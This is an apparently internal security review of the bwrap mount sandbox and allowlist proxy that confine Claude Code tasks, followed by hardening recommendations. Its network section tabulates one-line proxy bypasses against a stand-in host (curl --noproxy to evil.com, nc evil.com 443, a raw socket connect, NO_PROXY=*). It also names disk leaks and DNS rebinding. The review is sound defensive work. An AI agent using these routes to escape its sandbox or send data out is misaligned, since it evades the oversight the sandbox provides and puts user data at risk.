# Security Analysis: bwrap/proxy Sandbox

Date: 2026-03-05

## Architecture Overview

Tasks run Claude Code inside a bwrap mount-namespace sandbox within a tmux session. Network filtering is provided by a local HTTP CONNECT proxy (`proxy.ts`) with a hostname allowlist. The proxy URL is injected via `HTTP_PROXY`/`HTTPS_PROXY` env vars.

---

## 1. Disk Isolation

The worktree is the only intended writable path. System dirs are ro-bound; `/tmp` is a fresh `tmpfs`.

### Strengths

- System dirs (`/usr`, `/bin`, etc.) are ro-bound or symlinked correctly
- `/tmp` is a fresh `tmpfs` — ephemeral, not the host's
- `~/.claude.json` and `~/.claude/` subdirs are overlaid with per-task copies stored inside the worktree
- `--die-with-parent` ensures cleanup if the orchestrator dies

### Weaknesses

**W1: `~/.local` is ro-exposed if it appears in PATH** (`bwrap.ts:108-115`)

```
~/.local/bin in PATH → mounts ~/.local (ro)
→ ~/.local/share/deer/tasks/<other-task>/worktree is readable
```

A task can read all other concurrent tasks' worktrees, including their code and any data written there.

**W2: `/dev` is the host's device tree** (`bwrap.ts:77`)

`--dev /dev` is used without `--unshare-ipc`. The host IPC namespace is shared, so `/dev/shm` shared memory objects are accessible. Tasks can communicate via shared memory, and the sandboxed process can access any `/dev` node the host user has permission on (e.g., `/dev/fuse`).

**W3: No PID namespace isolation**

`--unshare-pid` is not set. `/proc` is remounted via `--proc /proc`, but without a new PID namespace it still reflects host PIDs. The sandboxed process can enumerate all host process names/cmdlines (e.g., `/proc/<pid>/cmdline`) and send signals to processes owned by the same user.

**W4: `~/.config` is fully ro-exposed** (`bwrap.ts:98`)

Broader than necessary — includes SSH client config, git global config, npm config, and any other tool config. Only specific sub-paths are actually needed.

---

## 2. Network Isolation

The proxy handles `CONNECT` tunnels only, rejects plain HTTP with 403, and enforces a hostname allowlist. The proxy listens on `127.0.0.1:<random-port>`.

### Critical Finding: No Network Namespace Isolation

`--unshare-net` is **never passed to bwrap**. The sandbox shares the host network namespace. The proxy is purely opt-in via env vars — any code that ignores `HTTP_PROXY`/`HTTPS_PROXY` makes unrestricted network connections.

| Bypass method                     | Example                               | Bypasses proxy? |
| --------------------------------- | ------------------------------------- | --------------- |
| curl `--noproxy` flag             | `curl --noproxy '*' https://evil.com` | Yes             |
| Direct socket (Python, Node, etc.)| `socket.connect(('evil.com', 443))`   | Yes             |
| netcat / socat                    | `nc evil.com 443`                     | Yes             |
| UDP (DNS, NTP, QUIC)              | Any UDP traffic                       | Yes             |
| IPv6                              | Direct IPv6 connections               | Yes             |
| `NO_PROXY` env var                | `NO_PROXY=* curl https://evil.com`    | Yes             |
| Tools without proxy support       | Custom binaries, Go binaries, etc.    | Yes             |

The proxy only controls traffic from tools that **voluntarily** respect HTTP proxy env vars. Claude Code itself does, but any tool invoked via the Bash tool may not.

### Proxy Implementation Issues

**P1: CONNECT-only, plain HTTP rejected — correct**
The proxy returns 403 for non-CONNECT methods (`proxy.ts:64-67`). This is correct behavior.

**P2: No IP-level filtering after DNS resolution**
The proxy connects to whatever IP the hostname resolves to. A DNS rebinding attack (allowlisted hostname resolves to an internal IP) is possible, since the proxy does not check whether the resolved address is RFC1918.

**P3: Subdomain wildcard spans unlimited levels**
`matchesAllowlist` allows `*.example.com` to match `deep.nested.example.com`. If wildcard entries are ever added to the allowlist, overly broad matching could allow unintended hosts.

**P4: `objects.githubusercontent.com` is allowlisted**
Allows downloading arbitrary content from GitHub release assets and raw uploads — a potential data exfiltration channel via GitHub if a task is compromised.

---

## Summary

| Control                 | Disk isolation | Network isolation | Status      |
| ----------------------- | :------------: | :---------------: | ----------- |
| bwrap mount namespace   | Yes            | No                | Partial     |
| `--unshare-net`         | N/A            | No                | **Missing** |
| `--unshare-pid`         | N/A            | N/A               | **Missing** |
| `--unshare-ipc`         | Partial        | N/A               | **Missing** |
| Proxy allowlist         | N/A            | Opt-in only       | Bypassable  |
| Worktree-only rw        | Mostly         | N/A               | Leaks via `~/.local` |
| `/dev` isolation        | No             | N/A               | Weak        |

---

## Recommendations (ordered by impact)

1. **[Network] Add `--unshare-net` + IP-level redirect.**
   Add `--unshare-net` to bwrap and enforce traffic through the proxy at the IP level (e.g., per-sandbox network namespace with a veth pair, `iptables`/`nftables` redirecting all TCP 443 → proxy). Without this, proxy bypass is trivial.

2. **[Disk] Add `--unshare-pid`.**
   Prevents the sandboxed process from enumerating or signaling host processes.

3. **[Disk] Add `--unshare-ipc`.**
   Isolates `/dev/shm` and other IPC mechanisms from the host.

4. **[Disk] Narrow the PATH-based HOME mounts.**
   Instead of mounting all of `~/.local` when `~/.local/bin` is in PATH, bind only the specific binary directories needed (e.g., `--ro-bind ~/.local/bin ~/.local/bin`), not the parent.

5. **[Disk] Narrow `~/.config` to specific sub-paths.**
   Only bind the sub-paths actually needed (e.g., `~/.config/git`, `~/.config/npm`) rather than the entire `~/.config`.

6. **[Proxy] Reject RFC1918 addresses after DNS resolution.**
   After resolving the target hostname, check the resolved IP against RFC1918/loopback ranges and reject connections to internal addresses.
